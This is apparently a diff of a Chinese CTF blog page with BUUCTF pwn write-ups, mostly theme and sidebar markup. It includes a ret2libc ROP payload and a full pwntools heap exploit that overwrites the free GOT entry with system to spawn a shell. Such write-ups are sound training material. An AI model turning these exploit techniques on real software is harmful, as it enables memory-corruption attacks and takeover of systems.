libc.symbols['puts']</span></span><br><span class="line"><span class="comment">#one_gadget = libc_base+0x4526a</span></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">binsh = libc.dump(<span class="string">'str_bin_sh'</span>) + libc_base</span><br><span class="line">ret =<span class="number">0x00000000004006b9</span> <span class="comment">#ret</span></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x50</span>+<span class="number">0x8</span>) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system_addr)</span><br><span class="line">send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <h2 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h2><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>程序主要代码：</p>
 <figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>)<span class="comment">;</span></span><br><span class="line">if ( <span class="name">fd</span> &gt; <span class="number">0</span> )</span><br><span class="line">  read(<span class="name">fd</span>, <span class="symbol">&amp;buf</span>, <span class="number">4</span>u)<span class="comment">;</span></span><br><span class="line">v2 = sub_804871F(<span class="name">buf</span>)<span class="comment">;</span></span><br><span class="line">sub_80487D0(<span class="name">v2</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
@@ -331,130 +553,406 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./easyheap'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./easyheap'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,con)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    p.send(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,con)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    p.send(con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>, <span class="string">'a'</span>)</span><br><span class="line">payload += p64(<span class="number">0x71</span>) + p64(<span class="number">0x6020ad</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x200</span>, payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">0</span>)*<span class="number">3</span>+p64(elf.got[<span class="string">'free'</span>])</span><br><span class="line">edit(<span class="number">4</span>, len(payload),payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">9</span>,p64(elf.plt[<span class="string">'system'</span>]))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">payload = 'a'*0x10+p64(0)+p64(0xa1)+p64(0x2000)+p64(0x6020c0-0x10)</span></span><br><span class="line"><span class="string">edit(1,len(payload),payload)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">add(0x90,'1')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.recvuntil(':')</span></span><br><span class="line"><span class="string">p.sendline('4869')</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
 
 
-  </div>
-</article>
+      
+    </div>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/04/Syc-Geek-10th/" rel="next" title="Syc Geek 10th">
+                <i class="fa fa-chevron-left"></i> Syc Geek 10th
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/02/28/SUCTF2019-playfmt/" rel="prev" title="SUCTF2019 playfmt">
+                SUCTF2019 playfmt <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/logo.jpg" alt="Apr1L">
+            
+              <p class="site-author-name" itemprop="name">Apr1L</p>
+              <p class="site-description motion-element" itemprop="description">二进制萌新QAQ</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-c-1-amp-ciscn-2019-en-2"><span class="nav-number">1.</span> <span class="nav-text">ciscn_2019_c_1&amp;ciscn_2019_en_2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyrop"><span class="nav-number">2.</span> <span class="nav-text">babyrop</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析程序"><span class="nav-number">2.1.</span> <span class="nav-text">分析程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-number">2.2.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#get-started"><span class="nav-number">3.</span> <span class="nav-text">get_started</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap"><span class="nav-number">4.</span> <span class="nav-text">babyheap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析程序-1"><span class="nav-number">4.1.</span> <span class="nav-text">分析程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#泄露libc基地址"><span class="nav-number">4.2.</span> <span class="nav-text">泄露libc基地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-shell"><span class="nav-number">4.3.</span> <span class="nav-text">get shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#完整EXP"><span class="nav-number">4.4.</span> <span class="nav-text">完整EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN5"><span class="nav-number">5.</span> <span class="nav-text">PWN5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-8"><span class="nav-number">6.</span> <span class="nav-text">ciscn_2019_n_8</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-1"><span class="nav-number">6.1.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyfengshui"><span class="nav-number">7.</span> <span class="nav-text">babyfengshui</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析程序-2"><span class="nav-number">7.1.</span> <span class="nav-text">分析程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#题目思路"><span class="nav-number">7.2.</span> <span class="nav-text">题目思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-2"><span class="nav-number">7.3.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-s-3"><span class="nav-number">8.</span> <span class="nav-text">ciscn_s_3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析程序-3"><span class="nav-number">8.1.</span> <span class="nav-text">分析程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-3"><span class="nav-number">8.2.</span> <span class="nav-text">EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考"><span class="nav-number">8.3.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HarekazeCTF2019-baby-rop"><span class="nav-number">9.</span> <span class="nav-text">[HarekazeCTF2019]baby_rop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn2-sctf-2016"><span class="nav-number">10.</span> <span class="nav-text">pwn2_sctf_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-pz-hackover-2016"><span class="nav-number">11.</span> <span class="nav-text">ez_pz_hackover_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-ne-5"><span class="nav-number">12.</span> <span class="nav-text">ciscn_2019_ne_5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HarekazeCTF2019-baby-rop2"><span class="nav-number">13.</span> <span class="nav-text">[HarekazeCTF2019]baby_rop2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-5"><span class="nav-number">14.</span> <span class="nav-text">ciscn_2019_n_5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-es-2"><span class="nav-number">15.</span> <span class="nav-text">ciscn_2019_es_2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level0"><span class="nav-number">16.</span> <span class="nav-text">jarvisoj_level0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#roarctf-2019-easy-pwn"><span class="nav-number">17.</span> <span class="nav-text">roarctf_2019_easy_pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析"><span class="nav-number">17.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-4"><span class="nav-number">17.2.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level2"><span class="nav-number">18.</span> <span class="nav-text">jarvisoj_level2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level2-x64"><span class="nav-number">19.</span> <span class="nav-text">jarvisoj_level2_x64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-tell-me-something"><span class="nav-number">20.</span> <span class="nav-text">jarvisoj_tell_me_something</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ZJCTF-2019-Login"><span class="nav-number">21.</span> <span class="nav-text">[ZJCTF 2019]Login</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level3-x64"><span class="nav-number">22.</span> <span class="nav-text">jarvisoj_level3_x64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-n-3"><span class="nav-number">23.</span> <span class="nav-text">ciscn_2019_n_3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析-1"><span class="nav-number">23.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-5"><span class="nav-number">23.2.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bjdctf-2020-babystack"><span class="nav-number">24.</span> <span class="nav-text">bjdctf_2020_babystack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bjdctf-2020-babyrop"><span class="nav-number">25.</span> <span class="nav-text">bjdctf_2020_babyrop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bjdctf-2020-babyrop2"><span class="nav-number">26.</span> <span class="nav-text">bjdctf_2020_babyrop2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bjdctf-2020-YDSneedGrirlfriend"><span class="nav-number">27.</span> <span class="nav-text">bjdctf_2020_YDSneedGrirlfriend</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-fm"><span class="nav-number">28.</span> <span class="nav-text">jarvisoj_fm</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#axb-2019-fmt32"><span class="nav-number">29.</span> <span class="nav-text">axb_2019_fmt32</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Black-Watch-入群题-PWN"><span class="nav-number">30.</span> <span class="nav-text">[Black Watch 入群题]PWN</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cmcc-simplerop"><span class="nav-number">31.</span> <span class="nav-text">cmcc_simplerop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-final-3"><span class="nav-number">32.</span> <span class="nav-text">ciscn_2019_final_3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ZJCTF-2019-EasyHeap"><span class="nav-number">33.</span> <span class="nav-text">[ZJCTF 2019]EasyHeap</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
 
 
         
-          <div id="footer-post-container">
-  <div id="footer-post">
+      </div>
+    </main>
 
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/about/">About</a></li>
-         
-          <li><a href="/archives/">Writing</a></li>
-         
-          <li><a href="/tags/">tags</a></li>
-         
-          <li><a href="/categories/">categories</a></li>
-        
-      </ul>
-    </div>
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Apr1L</span>
 
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-c-1-amp-ciscn-2019-en-2"><span class="toc-number">1.</span> <span class="toc-text">ciscn_2019_c_1&amp;ciscn_2019_en_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyrop"><span class="toc-number">2.</span> <span class="toc-text">babyrop</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析程序"><span class="toc-number">2.1.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">2.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-started"><span class="toc-number">3.</span> <span class="toc-text">get_started</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyheap"><span class="toc-number">4.</span> <span class="toc-text">babyheap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析程序-1"><span class="toc-number">4.1.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#泄露libc基地址"><span class="toc-number">4.2.</span> <span class="toc-text">泄露libc基地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-shell"><span class="toc-number">4.3.</span> <span class="toc-text">get shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#完整EXP"><span class="toc-number">4.4.</span> <span class="toc-text">完整EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN5"><span class="toc-number">5.</span> <span class="toc-text">PWN5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-8"><span class="toc-number">6.</span> <span class="toc-text">ciscn_2019_n_8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">6.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyfengshui"><span class="toc-number">7.</span> <span class="toc-text">babyfengshui</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析程序-2"><span class="toc-number">7.1.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目思路"><span class="toc-number">7.2.</span> <span class="toc-text">题目思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-2"><span class="toc-number">7.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-s-3"><span class="toc-number">8.</span> <span class="toc-text">ciscn_s_3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析程序-3"><span class="toc-number">8.1.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-3"><span class="toc-number">8.2.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">8.3.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HarekazeCTF2019-baby-rop"><span class="toc-number">9.</span> <span class="toc-text">[HarekazeCTF2019]baby_rop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn2-sctf-2016"><span class="toc-number">10.</span> <span class="toc-text">pwn2_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-pz-hackover-2016"><span class="toc-number">11.</span> <span class="toc-text">ez_pz_hackover_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-ne-5"><span class="toc-number">12.</span> <span class="toc-text">ciscn_2019_ne_5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HarekazeCTF2019-baby-rop2"><span class="toc-number">13.</span> <span class="toc-text">[HarekazeCTF2019]baby_rop2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-5"><span class="toc-number">14.</span> <span class="toc-text">ciscn_2019_n_5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-es-2"><span class="toc-number">15.</span> <span class="toc-text">ciscn_2019_es_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level0"><span class="toc-number">16.</span> <span class="toc-text">jarvisoj_level0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#roarctf-2019-easy-pwn"><span class="toc-number">17.</span> <span class="toc-text">roarctf_2019_easy_pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-number">17.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-4"><span class="toc-number">17.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level2"><span class="toc-number">18.</span> <span class="toc-text">jarvisoj_level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level2-x64"><span class="toc-number">19.</span> <span class="toc-text">jarvisoj_level2_x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-tell-me-something"><span class="toc-number">20.</span> <span class="toc-text">jarvisoj_tell_me_something</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ZJCTF-2019-Login"><span class="toc-number">21.</span> <span class="toc-text">[ZJCTF 2019]Login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level3-x64"><span class="toc-number">22.</span> <span class="toc-text">jarvisoj_level3_x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-3"><span class="toc-number">23.</span> <span class="toc-text">ciscn_2019_n_3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-1"><span class="toc-number">23.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-5"><span class="toc-number">23.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-babystack"><span class="toc-number">24.</span> <span class="toc-text">bjdctf_2020_babystack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-babyrop"><span class="toc-number">25.</span> <span class="toc-text">bjdctf_2020_babyrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-babyrop2"><span class="toc-number">26.</span> <span class="toc-text">bjdctf_2020_babyrop2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-YDSneedGrirlfriend"><span class="toc-number">27.</span> <span class="toc-text">bjdctf_2020_YDSneedGrirlfriend</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-fm"><span class="toc-number">28.</span> <span class="toc-text">jarvisoj_fm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#axb-2019-fmt32"><span class="toc-number">29.</span> <span class="toc-text">axb_2019_fmt32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Black-Watch-入群题-PWN"><span class="toc-number">30.</span> <span class="toc-text">[Black Watch 入群题]PWN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmcc-simplerop"><span class="toc-number">31.</span> <span class="toc-text">cmcc_simplerop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-final-3"><span class="toc-number">32.</span> <span class="toc-text">ciscn_2019_final_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ZJCTF-2019-EasyHeap"><span class="toc-number">33.</span> <span class="toc-text">[ZJCTF 2019]EasyHeap</span></a></li></ol>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://suvii22.github.io/2019/11/24/BUUCTF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://suvii22.github.io/2019/11/24/BUUCTF/&text=BUUCTF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://suvii22.github.io/2019/11/24/BUUCTF/&title=BUUCTF"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://suvii22.github.io/2019/11/24/BUUCTF/&is_video=false&description=BUUCTF"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=BUUCTF&body=Check out this article: http://suvii22.github.io/2019/11/24/BUUCTF/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://suvii22.github.io/2019/11/24/BUUCTF/&title=BUUCTF"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://suvii22.github.io/2019/11/24/BUUCTF/&title=BUUCTF"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://suvii22.github.io/2019/11/24/BUUCTF/&title=BUUCTF"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://suvii22.github.io/2019/11/24/BUUCTF/&title=BUUCTF"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://suvii22.github.io/2019/11/24/BUUCTF/&name=BUUCTF&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://suvii22.github.io/2019/11/24/BUUCTF/&t=BUUCTF"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
+  
 </div>
 
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
         
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
-    
-    
-    2018-2020
-    Apr1L
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
